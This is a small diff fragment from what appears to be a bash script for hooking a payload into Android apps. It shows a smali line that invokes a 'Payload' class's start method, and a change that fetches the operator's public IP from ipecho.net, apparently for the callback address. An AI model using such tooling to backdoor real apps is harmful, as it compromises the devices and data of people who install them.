@@ -14,7 +14,7 @@ vok='    invoke-static {p0}, Lcom/appandroid/stage/Payload;->start(Landroid/cont
 prompt="Please choose one to hook it : "
 PS3="$prompt"
 path=`pwd`
-myip=''
+myip='curl ipecho.net/plain'
 red=`tput setaf 1`
 green=`tput setaf 2`
 echo  "##############################################################"
